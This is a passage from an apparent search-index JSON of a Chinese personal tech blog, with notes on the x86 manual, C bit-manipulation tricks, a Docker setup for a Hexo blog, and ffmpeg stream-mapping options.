<p>\u5728\u4e0d\u540c\u7279\u6743\u7ea7\u95f4\u8c03\u7528\uff08\u4f1a\u4f7f\u7528\u5230\u5417\uff0c\u4e00\u822c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u5207\u6362\u7279\u6743\u7ea7\u518d\u8c03\u7528\u7684\u5427\uff1f\uff09</p> </li> <li> <p>\u7ecf\u9a8c\uff1a</p> </li> <li> <p>0x8(%ebp)\u5bf9\u5e94\u7b2c\u4e00\u4e2a\u53c2\u6570</p> </li> <li> <p>\u51fd\u6570\u8fd4\u56de\u503c\u5b58\u50a8\u5728eax\u4e2d</p> </li> <li> <p>enter, leave\uff1aenter\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u6307\u5b9a\u5206\u914d\u591a\u5927\u7684\u5185\u5b58\u7528\u4e8e\u5b58\u50a8\u51fd\u6570\u5c40\u90e8\u53d8\u91cf(\u7b49\u4ef7\u4e8e\u81ea\u5df1\u6267\u884csub size, %esp)\uff0c\u4e00\u53e6\u4e00\u4e2a\u4e3alexical nesting level\uff0c\u4f1a\u5b89\u88c5\u5c42\u6b21\u50a8\u5b58\u7236\u51fd\u6570\u7684ebp\u3002</p> <p>leave\u6062\u590denter\u7684\u64cd\u4f5c\u3002\u6bd4\u8f83\u7279\u522b\u7684\u662f\uff0c\u5982\u679c\u4f7f\u7528\u4e86leave\uff0c\u5c31\u4e0d\u9700\u8981\u81ea\u5df1\u5728\u51fd\u6570\u7ed3\u5c3epop\u4e86\u3002</p> <p></p> <p></p> </li> </ol>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u5f02\u5e38","title":"\u5f02\u5e38","text":"","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#ucore","title":"ucore","text":"","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#\u6bb5","title":"\u6bb5","text":"<p>voulme3 chapter3 p2893</p> <p></p> <p>\u542f\u52a8\u5206\u6bb5\u673a\u5236\uff0c\u672a\u542f\u52a8\u5206\u2eda\u9875\u673a\u5236\uff1a\u903b\u8f91\u5730\u5740--&gt; (\u5206\u6bb5\u5730\u5740\u8f6c\u6362) --&gt;\u7ebf\u6027\u5730\u5740=\u7269\u7406\uf9e4\u5730\u5740 \u542f\u52a8\u5206\u6bb5\u548c\u5206\u2eda\u9875\u673a\u5236\uff1a\u903b\u8f91\u5730\u5740--&gt; (\u5206\u6bb5\u5730\u5740\u8f6c\u6362) --&gt;\u7ebf\u6027\u5730\u5740--&gt;\u5206\u2eda\u9875\u5730\u5740\u8f6c\u6362) --&gt;\u7269\u7406\uf9e4\u5730\u5740</p>","tags":["x86"]},{"location":"%E9%98%85%E8%AF%BB/2022/04/21/2022-04-21-%E8%AF%BBx86%E6%89%8B%E5%86%8C%E8%AE%B0%E5%BD%95/#--\u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\u5668\u4e2d\u7684cpl\u5b57\u6bb52\u4f4d\u7684\u503c\u603b\u662f\u7b49\u4e8ecpu\u7684\u5f53\u524d\u7279\u6743\u7ea7\u6240\u4ee5\u53ea\u8981\u770b\u4e00\u773ccs\u4e2d\u7684cpl\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053-\u6b64\u523b\u7684\u7279\u6743\u7ea7\u4e86\u4e86","title":"- \u4ee3\u7801\u6bb5\u5bc4\u5b58\u5668\ufa38\u4e2d\u7684CPL\u5b57\u6bb5\uff082\u4f4d\uff09\u7684\u503c\u603b\u662f\u7b49\u4e8eCPU\u7684\u5f53\u524d\u7279\u6743\u7ea7\uff0c\u6240\u4ee5\u53ea\u8981\u770b\u2f00\u4e00\u773cCS\u4e2d\u7684CPL\uff0c\u4f60\u5c31\u53ef\u4ee5\u77e5\u9053 \u6b64\u523b\u7684\u7279\u6743\u7ea7\u4e86\uf9ba\u3002","text":"<p>A segment selector is a 16-bit identifier for a segment (see Figure 3-6). It does not point directly to the segment, but instead points to the segment descriptor that defines the segment.</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/05/23/2022-05-23-%E4%BD%8D%E6%93%8D%E4%BD%9Ctricky/","title":"ARM\u76f8\u5173","text":"<p>\u4f4d\u64cd\u4f5ctricks</p> <ul> <li>int</li> <li>float</li> </ul>","tags":["\u4f4d\u64cd\u4f5c"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/05/23/2022-05-23-%E4%BD%8D%E6%93%8D%E4%BD%9Ctricky/#int","title":"int","text":"<pre><code>    //\u4ee5\u4e0b\u6240\u6709\u53d8\u91cf\u9ed8\u8ba4\u5747\u4e3aint\u7c7b\u578b\n    !!x;        //\u7f29\u4f4d\u6216 (x\u975e0)\n    !(~x);      //\u7f29\u4f4d\u4e0e (x\u51681)\n    !(x^y);     //x==y\n    ~x + 1;     //-x\uff0c\u5982\u679cx\u4e3a0x80000000\uff0c\u8fd4\u56de0x80000000\n\n    mask = x&gt;&gt;31;\n    x = (~x+1) &amp; mask | x &amp; ~mask;  //abs(x), mask\u7528\u6cd5\n\n    ~(~x &amp; ~y); //x | y\n\n\n\n/* howManyBits - return the minimum number of bits required to represent x in\n     *             two's complement\n     *  Examples: howManyBits(12) = 5\n     *            howManyBits(298) = 10\n     *            howManyBits(-5) = 4\n     *            howManyBits(0)  = 1\n     *            howManyBits(-1) = 1\n     *            howManyBits(0x80000000) = 32\n     *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;\n     *  Max ops: 90\n     *  Rating: 4\n     */\nint howManyBits(int x)      //Mark\n{\n    //ref: https://github.com/jerrylzy/CS33/blob/master/Lab/datalab/bits.c\n    /*\n     * We first bit invert all negative numbers and\n     * use binary search to find out the log2(n).\n     * Then we add 1 to the final result since we need\n     * the MSB to represent the sign.\n     * Note: finding the following things are equal:\n     * 1. find the most significant bit of 1 for positive numbers\n     * 2. find the most significant bit of 0 for negative numbers\n     */\n    int mask = x&gt;&gt;31;\n    x = (x &amp; ~mask) | (~x &amp; mask);\n\n    //the algorithem get the unsigned int bit width(Most Significant One bit to LSb)\n    int bit16, bit8, bit4, bit2, bit1, bit0;\n    bit16 = (!!(x&gt;&gt;16))&lt;&lt;4;\n    x = x &gt;&gt; bit16;\n\n    bit8 = (!!(x&gt;&gt;8))&lt;&lt;3;\n    x = x &gt;&gt; bit8;\n\n    bit4 = (!!(x&gt;&gt;4))&lt;&lt;2;\n    x = x &gt;&gt; bit4;\n\n    bit2 = (!!(x&gt;&gt;2))&lt;&lt;1;\n    x = x &gt;&gt; bit2;\n\n    bit1 = (x&gt;&gt;1)&amp;1;\n    x = x &gt;&gt; bit1;\n\n    bit0 = x&amp;1;\n\n    return bit16 + bit8 + bit4 + bit2 + bit1 + bit0 + 1;    //plus 1 for 2's complement's sign bit\n}\n\n//find the one bit number in x\nint count_one_8(unsigned int x){\n    /*\n     * Firstly, we split the 32 bits to 11 groups, 3 bits per group(except the last group), \n     * Then we can caculate the sum of 3 bits in eache group by  \n     * expression: x - (x&gt;&gt;1) -(x&gt;&gt;2) = x2 + x1 + x0 (x=[x2, x1, x0])\n     * Then we sum each two contiguous group by a shift-add: tmp + (tmp&gt;&gt;3)\n     * The sum(after masked) will be (x0+x1+...x5) + (x6+x7+...x11)*(2^6)^1 + \n     * (x12+x13+...x17)*(2^6)^2+...\n     * Last, we can get (x0+x1+...x63)%63 by caculate the sum mod 63.\n     */\n    unsigned int tmp;\n    tmp = x - ((x&gt;&gt;1)&amp;033333333333) - ((x&gt;&gt;2)&amp;011111111111);\n    return ((tmp + (tmp&gt;&gt;3))&amp;030707070707)%63;\n}\n\n//same way with 4 bits per group\nint count_one_16(unsigned int x){\n    unsigned int tmp;\n    tmp = x - ((x&gt;&gt;1)&amp;0x77777777) - ((x&gt;&gt;2)&amp;0x33333333) - ((x&gt;&gt;3)&amp;0x11111111);\n    return ((tmp + (tmp&gt;&gt;4))&amp;0x0f0f0f0f)%255;\n}\n</code></pre>","tags":["\u4f4d\u64cd\u4f5c"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/05/23/2022-05-23-%E4%BD%8D%E6%93%8D%E4%BD%9Ctricky/#float","title":"float","text":"<pre><code>//float\n/* \n * floatScale2 - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatScale2(unsigned uf)\n{\n    unsigned int m = uf&amp;0x7fffff;\n    unsigned int exp = (uf&gt;&gt;23)&amp;0xff;\n    unsigned int symbol = uf&gt;&gt;31;\n    if(exp==255){\n        return uf;\n    }else if(exp==0){\n        if(m&amp;0x400000){\n            exp++;\n            m&lt;&lt;=1;\n        }else{\n            m&lt;&lt;=1;\n        }\n    }else{\n        exp++;\n    }\n    return (symbol&lt;&lt;31) | (exp&lt;&lt;23) | (m&amp;0x7fffff);\n}\n</code></pre> <pre><code>/* \n * floatFloat2Int - Return bit-level equivalent of expression (int) f\n *   for floating point argument f.\n *   Argument is passed as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point value.\n *   Anything out of range (including NaN and infinity) should return\n *   0x80000000u.\n *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nint floatFloat2Int(unsigned uf)\n{\n    int m = uf&amp;0x7fffff;\n    int exp = ((uf&gt;&gt;23)&amp;0xff) - 127;\n    int symbol = uf&gt;&gt;31;\n    int out = 0;\n\n    //[-2^31, 2^31-1]\n    if(exp&lt;0){\n        return 0;\n    }else if(exp&lt;=23){\n        out = (0x800000|m)&gt;&gt;(23-exp);\n    }else if(exp&lt;=30){\n        out = (0x800000|m)&lt;&lt;(exp-23);\n    }else{\n        return 0x80000000;\n    }\n    return symbol ? ~out + 1 : out;\n}\n</code></pre>","tags":["\u4f4d\u64cd\u4f5c"]},{"location":"%E6%8A%98%E8%85%BE/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/","title":"\u4f7f\u7528docker\u914d\u7f6ehexo\u535a\u5ba2\u73af\u5883","text":"<p>\u7531\u4e8enodejs\u7248\u672c\u8f83\u591a\uff0c\u76f4\u63a5\u5728\u5bbf\u4e3b\u673a\u4e0a\u5b89\u88c5nodejs\u73af\u5883\u4e0d\u5bb9\u6613\u7ba1\u7406\u3002\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528docker\u7ef4\u62a4\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8ehexo\u7684\u73af\u5883\u3002</p>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#hexo\u76f4\u63a5\u5b89\u88c5","title":"hexo\u76f4\u63a5\u5b89\u88c5","text":"<p>\u6559\u7a0b: https://hexo.io/zh-cn/docs/index.html</p> <p>\u9996\u5148\u9700\u8981\u5b89\u88c5node.js\u548cgit\uff0c\u7136\u540e\u5b89\u88c5hexo</p> <pre><code>npm install -g hexo-cli\n</code></pre> <p>\u5e38\u7528hexo\u547d\u4ee4</p> <pre><code>#\u5efa\u7ad9\nhexo init\nnpm install     #init\u540e\u9700\u8981\u4f7f\u7528npm\u5b89\u88c5hexo\u6240\u9700\u4f9d\u8d56\n\nhexo new [layout] &lt;title&gt;\n\nhexo clean      #\u5220\u9664public\u76ee\u5f55(\u751f\u6210\u7684html)\nhexo s -p PORT  #\u8fd0\u884cserver\uff0c\u5bf9markdown\u7684\u4fee\u6539\u4f1a\u5b9e\u65f6\u53cd\u5e94\nhexo g          #\u751f\u6210html\nhexo d          #\u90e8\u7f72\uff0c\u6216hexo d -g\n</code></pre>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#docker\u5b89\u88c5","title":"docker\u5b89\u88c5","text":"<p>\u4e3b\u8981\u8fc7\u7a0b\uff1a 1. \u4f7f\u7528Dockerfile\uff0c\u57fa\u4e8enode\u57fa\u955c\u50cf\uff0c\u521b\u5efa\u542bhexo\u7684\u955c\u50cf 2. \u8fd0\u884c\u8be5\u955c\u50cf\uff0c\u5c06blog\u76ee\u5f55\u6620\u5c04\u5230docker\u5bb9\u5668\u4e2d\uff0c\u7136\u540e\u8fdb\u884chexo\u64cd\u4f5c 3. [\u53ef\u9009]\u4e3a\u4e86\u907f\u514d\u90e8\u7f72\u65f6\u8f93\u5165github\u5bc6\u7801\uff0c\u53ef\u4ee5\u5c06.ssh\u76ee\u5f55\u6620\u5c04\u5230\u5bb9\u5668\u4e2d</p>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#dockerfile","title":"dockerfile","text":"<p>\u8bf4\u660e</p> <ul> <li> <p>\u53c2\u8003\u7684dockerfile\uff1a\u4f7f\u7528docker\u642d\u5efaHexo - wanf3ng's blog</p> </li> <li> <p>\u8bbe\u7f6e\u7528\u6237\u95ee\u9898\uff1a\u5728docker\u4e2d\u57f7\u884chexo | Plusku@blog</p> <ul> <li>\u9ed8\u8ba4\u4e86\u7528\u6237uid=1000\u3002\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9aUser node\u6765\u907f\u514d\u5bb9\u5668\u5185\u751f\u6210\u7684\u6587\u4ef6\u4e3aroot\u6240\u6709\u95ee\u9898\u3002</li> </ul> </li> <li> <p>\u6dfb\u52a0\u4e86git\u8bbe\u7f6e</p> </li> <li> <p>\u4f7f\u7528node12.0\uff0c\u5426\u5219hexo\u8fd0\u884c\u4f1a\u62a5\u9519</p> </li> </ul> <pre><code>FROM node:12.6.0-alpine\n\n# \u5207\u6362\u4e2d\u79d1\u5927\u6e90\nRUN sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories\n# \u5b89\u88c5bash git openssh\nRUN apk add bash git openssh\n\n# \u8bbe\u7f6e\u5bb9\u5668\u65f6\u533a\u4e3a\u4e0a\u6d77\nRUN apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\\n&amp;&amp; echo \"Asia/Shanghai\" &gt; /etc/timezone \\\n&amp;&amp; apk del tzdata\n\n# \u5b89\u88c5hexo\nRUN \\ \nnpm config set registry https://registry.npm.taobao.org \\\n&amp;&amp;npm install \\\n&amp;&amp;npm install hexo-cli -g \\\n&amp;&amp; npm install hexo-server --save \\\n&amp;&amp; npm install hexo-asset-image --save \\\n&amp;&amp; npm install hexo-wordcount --save \\\n&amp;&amp; npm install hexo-generator-sitemap --save \\\n&amp;&amp; npm install hexo-generator-baidu-sitemap --save \\\n&amp;&amp; npm install hexo-deployer-git --save\n\nARG GIT_NAME\nARG GIT_EMAIL\n\nUser node\n\n# \u8bbe\u7f6egit push\u65f6\u7684\u7528\u6237\u540d\u548c\u90ae\u7bb1\nRUN \\\n    git config --global user.email \"$GIT_EMAIL\" \\\n    &amp;&amp; git config --global user.name \"$GIT_NAME\"\n\nWORKDIR /home/node/blog\n\nEXPOSE 4000\n\nENTRYPOINT [\"/bin/bash\"]\n</code></pre>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#build\u955c\u50cf","title":"build\u955c\u50cf","text":"<pre><code>docker build -t yfy/hexo-blog\\\n    --build-arg GIT_NAME=\"Fuyan Yuan\"\\\n    --build-arg GIT_EMAIL=\"33221728+TheRainstorm@users.noreply.github.com\"\\\n    .\n</code></pre>","tags":["docker","hexo"]},{"location":"%E6%8A%98%E8%85%BE/2022/05/24/2022-05-24-%E4%BD%BF%E7%94%A8docker%E9%85%8D%E7%BD%AEhexo%E5%8D%9A%E5%AE%A2%E7%8E%AF%E5%A2%83/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<pre><code>docker run -it --name hexo-blog\\\n    -p 4000:4000 \\\n    -v /home/yfy/Documents/hexo-blog:/home/node/blog/ \\\n    -v /home/yfy/.ssh:/home/node/.ssh\\\n    yfy/hexo-blog\n</code></pre> <p>\u5982\u679cblog\u4e0b\u6ca1\u6709node_modules\uff0c\u5219\u9700\u8981</p> <pre><code>npm install\n</code></pre> <p>\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528hexo\u5373\u53ef</p> <p>docker\u6280\u5de7\uff1a\u8fde\u63a5\u5230\u5df2\u6709\u5bb9\u5668\u3002</p> <pre><code>docker attach CONTAINER\ndocker exec -it CONTAINER CMD\n</code></pre> <p><code>attach</code>\u547d\u4ee4\u5c06\u7ec8\u7aef\u7684\u6807\u51c6\u8f93\u5165\uff0c\u6807\u51c6\u8f93\u51fa\uff0c\u6807\u51c6\u9519\u8bef\u8fde\u63a5\u5230\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u3002\u5982\u679c\u5bb9\u5668\u6b63\u5728\u8fd0\u884c\u7684\u547d\u4ee4\u662fbash\uff0c\u5219exit\u540e\uff0c\u5bb9\u5668\u9000\u51fa</p> <p><code>exec</code>\u547d\u4ee4\u5728\u5bb9\u5668\u5185\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\u3002\u5e38\u89c1\u5982bash</p>","tags":["docker","hexo"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/","title":"ffmpeg","text":"<p>ffmpeg</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u57fa\u7840","title":"\u57fa\u7840","text":"<ul> <li>ffmpeg\u8bfb\u53d6\u4efb\u610f\u4e2ainput\uff08\u4f7f\u7528-i\u6307\u5b9a\uff09\uff0c\u5199\u5230\u4efb\u610f\u4e2a\u8f93\u51fa\uff08\u901a\u8fc7plain output url\u6307\u5b9a\uff09</li> <li>\u6bcf\u4e2a\u8f93\u51fa\u6216\u8005\u8f93\u51fa\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u6570\u91cf\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u6d41(stream)\uff0cstreams\u79cd\u7c7b\u6709<code>video/audio/subtitle/attachment/data</code></li> <li>stream\u7684\u7c7b\u578b\u548c\u6570\u91cf\u53d7\u5bb9\u5668\u683c\u5f0f(container format)\u5f71\u54cd\uff0c\u4ece\u54ea\u4e9binput\u9009\u53d6\u54ea\u4e9b\u6d41\uff0c\u8f93\u51fa\u5230\u54ea\u4e9boutput\u7684\u8fc7\u7a0b\uff08stream selection\uff09\u65e2\u53ef\u4ee5\u662f\u81ea\u52a8\u7684\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>-map</code>\u6307\u5b9a\u3002</li> <li>options\u5bf9\u4e0b\u4e00\u4e2a\u6587\u4ef6\u8d77\u4f5c\u7528\uff0c\u53ef\u4ee5\u91cd\u590d\u76f8\u540c\u7684\u9009\u9879</li> <li>\u5f15\u7528input\u6216\u8005stream\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ece0\u5f00\u59cb\u7684\u7d22\u5f15\u3002\u6bd4\u5982\u7b2c\u4e00\u4e2a\u8f93\u5165\u662f<code>0</code>\uff0c<code>2:3</code>\u00a0\u8868\u793a\u7b2c3\u4e2a\u6587\u4ef6\u7684\u7b2c4\u4e2a\u6d41</li> </ul> <p>\u4e00\u4e9b\u7b80\u5355\u7684\u4f8b\u5b50</p> <p>Convert an input media file to a different format, by re-encoding media streams: <pre><code>ffmpeg -i input.avi output.mp4\n</code></pre> Set the video bitrate of the output file to 64 kbit/s: <pre><code>ffmpeg -i input.avi -b:v 64k -bufsize 64k output.mp4\n</code></pre> Force the frame rate of the output file to 24 fps: <pre><code>ffmpeg -i input.avi -r 24 output.mp4\n</code></pre> Force the frame rate of the input file (valid for raw formats only) to 1 fps and the frame rate of the output file to 24 fps: <pre><code>ffmpeg -r 1 -i input.m2v -r 24 output.mp4\n</code></pre></p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#ffmpeg\u6d41\u7a0b","title":"ffmpeg\u6d41\u7a0b","text":"<ul> <li>decode -&gt; filter -&gt; encode</li> <li>\u4f7f\u7528copy\u9009\u9879\u65f6\uff0c\u53ef\u4ee5\u8df3\u8fc7decode\u3002Encoded packets are then passed to the decoder (unless streamcopy is selected for the stream, see further for a description).   <pre><code> _______              ______________\n|       |            |              |\n| input |  demuxer   | encoded data |   decoder\n| file  | ---------&gt; | packets      | -----+\n|_______|            |______________|      |\n                                           v\n                                       _________\n                                      |         |\n                                      | decoded |\n                                      | frames  |\n                                      |_________|\n ________             ______________       |\n|        |           |              |      |\n| output | &lt;-------- | encoded data | &lt;----+\n| file   |   muxer   | packets      |   encoder\n|________|           |______________|\n</code></pre></li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#filter","title":"filter","text":"","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#simple-filter","title":"simple filter","text":"<ul> <li>\u4e00\u4e2a\u8f93\u5165\uff0c\u4e00\u4e2a\u8f93\u51fa\uff0c\u7c7b\u578b\u76f8\u540c</li> <li>\u5bf9\u6bcf\u4e2a\u6d41\u4f7f\u7528-filter\u9009\u9879\u3002-vf, -af\u662fvideo\u548caudio\u7684\u522b\u540d <pre><code>_________                        ______________\n|         |                      |              |\n| decoded |                      | encoded data |\n| frames  |\\                   _ | packets      |\n|_________| \\                  /||______________|\n           \\   __________   /\nsimple     _\\||          | /  encoder\nfiltergraph   | filtered |/\n              | frames   |\n              |__________|\n</code></pre></li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#complex-filter","title":"Complex filter","text":"<p>Complex filter graphs are those which cannot be described as simply a linear processing chain applied to one stream. - \u591a\u4e2a\u8f93\u5165\u6216\u8f93\u51fa - \u4f7f\u7528<code>-filter_complex</code> - \u9ed8\u8ba4\u662f\u5168\u5c40\u7684\u9009\u9879</p> <p>\u4f8b\u5b50</p> <p>overlay\uff1a\u5c06\u4e00\u4e2a\u89c6\u9891\u53e0\u52a0\u5230\u53e6\u4e00\u4e2a\u89c6\u9891\u4e0a</p> <p>Define a complex filtergraph, i.e. one with arbitrary number of inputs and/or outputs.  \u201cFiltergraph syntax\u201d section of the ffmpeg-filters manual.</p> <p>Input link labels must refer to input streams using the <code>[file_index:stream_specifier]</code> syntax (i.e. the same as -map uses). If stream_specifier matches multiple streams, the first one will be used. An unlabeled input will be connected to the first unused input stream of the matching type.</p> <p>Output link labels are referred to with -map. Unlabeled outputs are added to the first output file.</p> <pre><code>ffmpeg -i video.mkv -i image.png -filter_complex '[0:v][1:v]overlay[out]' -map\n        '[out]' out.mkv\n</code></pre>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stream-selection","title":"stream selection","text":"","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u81ea\u52a8\u9009\u62e9","title":"\u81ea\u52a8\u9009\u62e9","text":"<ul> <li>\u6839\u636eoutput\u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u51b3\u5b9a\u662f\u5426\u5305\u542bvideo/audio/subtitles\u7b49\u5404\u79cd\u7c7b\u578b\u7684\u6d41</li> <li>\u6d41\u9009\u62e9\u7684\u5177\u4f53\u89c4\u5219</li> <li>for video, it is the stream with the highest resolution,</li> <li>for audio, it is the stream with the most channels,</li> <li>for subtitles, it is the first subtitle stream found but there\u2019s a caveat. The output format\u2019s default subtitle encoder can be either text-based or image-based, and only a subtitle stream of the same type will be chosen.</li> </ul>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#map\u9009\u9879","title":"map\u9009\u9879","text":"<p><code>-map [-]input_file_id[:stream_specifier][?][,sync_file_id[:stream_specifier]] | [linklabel] (*output*)</code></p> <p>Designate one or more input streams as a source for the output file. Each input stream is identified by the input file index input_file_id and the input stream index input_stream_id within the input file. Both indices start at 0. If specified, sync_file_id:stream_specifier sets which input stream is used as a presentation sync reference.</p> <p>\u4f8b\u5b50</p> <p>For example, if you have two audio streams in the first input file, these streams are identified by \"0:0\" and \"0:1\". You can use <code>-map</code> to select which streams to place in an output file.</p> <p>For example: <pre><code>ffmpeg -i INPUT -map 0:1 out.wav\n</code></pre> will map the input stream in INPUT identified by \"0:1\" to the (single) output stream in out.wav.</p> <p>For example, to select the stream with index 2 from input file a.mov (specified by the identifier \"0:2\"), and stream with index 6 from input b.mov (specified by the identifier \"1:6\"), and copy them to the output file out.mov: <pre><code>ffmpeg -i a.mov -i b.mov -c copy -map 0:2 -map 1:6 out.mov\n</code></pre></p> <p>To select all video and the third audio stream from an input file: <pre><code>ffmpeg -i INPUT -map 0:v -map 0:a:2 OUTPUT\n</code></pre></p> <p>To map all the streams except the second audio, use negative mappings <pre><code>ffmpeg -i INPUT -map 0 -map -0:a:1 OUTPUT\n</code></pre></p> <p>To map the video and audio streams from the first input, and using the trailing <code>?</code>, ignore the audio mapping if no audio streams exist in the first input: <pre><code>ffmpeg -i INPUT -map 0:v -map 0:a? OUTPUT\n</code></pre></p> <p>To pick the English audio stream: <pre><code>ffmpeg -i INPUT -map 0:m:language:eng OUTPUT\n</code></pre></p> <p>Note that using this option disables the default mappings for this output file.</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stream-handling","title":"stream handling","text":"<p>Stream handling is independent of stream selection, with an exception for subtitles described below. Stream handling is set via the\u00a0<code>-codec</code>\u00a0option addressed to streams within a specific\u00a0output\u00a0file. In particular, codec options are applied by ffmpeg after the stream selection process and thus do not influence the latter. If no\u00a0<code>-codec</code>\u00a0option is specified for a stream type, ffmpeg will select the default encoder registered by the output file muxer. - \u5728stream selection\u4e4b\u540e\u8fdb\u884c - \u4f7f\u7528-codec\u6307\u5b9a\u5bf9output\u4e2d\u6d41\u7684\u5904\u7406\u65b9\u5f0f - \u5982\u679c\u6ca1\u6709\u6307\u5b9a-codec\uff0c\u5219\u6309\u7167output\u6587\u4ef6\u683c\u5f0f\u9009\u62e9\u9ed8\u8ba4\u7684encoder</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#options","title":"Options","text":"<p>\u6ce8\u610f\uff1affmpeg\u5f88\u591a\u9009\u9879\uff0c\u5176\u5173\u4e8einput/output\u7684\u4f4d\u7f6e\u7684\u4e0d\u540c\uff0c\u4f1a\u4ea7\u751f\u5b8c\u5168\u4e0d\u540c\u7684\u6548\u679c</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stream-specifier","title":"stream specifier","text":"<p>\u5bf9\u4e8e\u4e00\u4e9b\u9488\u5bf9\u67d0\u4e2a\u6d41\u7684\u9009\u9879\uff08\u5982-codec, -bitrate\uff09\uff0c\u4f7f\u7528stream specifier\u6765\u6307\u5b9a\u9488\u5bf9\u54ea\u4e2a\u6d41\u3002Some options are applied per-stream, e.g. bitrate or codec. Stream specifiers are used to precisely specify which stream(s) a given option belongs to. \u5982\uff1a - -codec: a:1 ac3\uff0c\u6307\u5b9a\u7b2c2\u4e2aaudio\u6d41\u7684\u7f16\u7801 - -codec:v copy\u6307\u5b9a\u590d\u5236video\u6d41\uff08-codec or -codec:\u6307\u5b9a\u590d\u5236\u6240\u6709\u6d41\uff09</p>","tags":["ffmpeg"]},{"location":"%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#main-options","title":"main options","text":"<ul> <li><code>-c[:stream_specifier] codec (input/output,per-stream)</code> Select an encoder (when used before an output file) or a decoder (when used before an input file)  for one or more streams. codec is the name of a decoder/encoder or a special value copy (output only) to indicate that the stream is not to be re-encoded.</li> </ul> <p><pre><code>ffmpeg -i INPUT -map 0 -c:v libx264 -c:a copy OUTPUT\n</code></pre>   encodes all video streams with libx264 and copies all audio streams.</p> <p>\u4f5c\u7528\u987a\u5e8f\u4e3a\u540e\u8005\u4f18\u5148   <pre><code>ffmpeg -i INPUT -map 0 -c copy -c:v:1 libx264 -c:a:137 libvorbis OUTPUT\n</code></pre>   will copy all the streams except the second video, which will be encoded with libx264, and the 138th audio, which will be encoded with libvorbis.</p> <ul> <li> <p><code>-t duration (*input/output*)</code>   When used as an input option (before <code>-i</code>), limit the duration of data read from the input file.   When used as 